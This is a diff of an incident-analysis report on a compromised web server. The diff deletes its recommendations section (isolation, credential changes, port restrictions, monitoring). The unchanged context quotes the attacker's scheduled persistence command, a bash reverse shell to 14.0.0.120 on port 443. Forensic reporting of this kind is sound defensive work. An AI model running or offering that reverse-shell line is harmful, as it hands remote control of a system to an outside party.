@@ -61,15 +61,3 @@ The following ports were actively used during the attack:
 ### 7. Persistence Command
 - **Scheduled Command**: `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
   - This command was used to establish a reverse shell and maintain persistence on the compromised system.
-
-## Recommendations
-
-1. **Immediate Action**: Isolate the compromised web server (10.0.0.112) from the network to prevent further damage or data exfiltration.
-2. **Credential Review**: Ensure all default credentials are updated across all servers and services, especially those accessible via the internet.
-3. **Firewall Policies**: Restrict access to sensitive ports such as **8080** and **22** to trusted IPs only.
-4. **File Integrity Monitoring**: Set up monitoring on critical directories such as `/manager` to detect unauthorized uploads or changes in real-time.
-5. **Incident Response**: Conduct a comprehensive review of server logs and deploy endpoint detection and response (EDR) tools to identify any further compromise or lateral movement by the attacker.
-
----
-
-This analysis highlights the importance of securing administrative interfaces and regularly auditing server configurations to prevent similar incidents in the future. Stay vigilant and ensure your systems are hardened against common attack vectors.
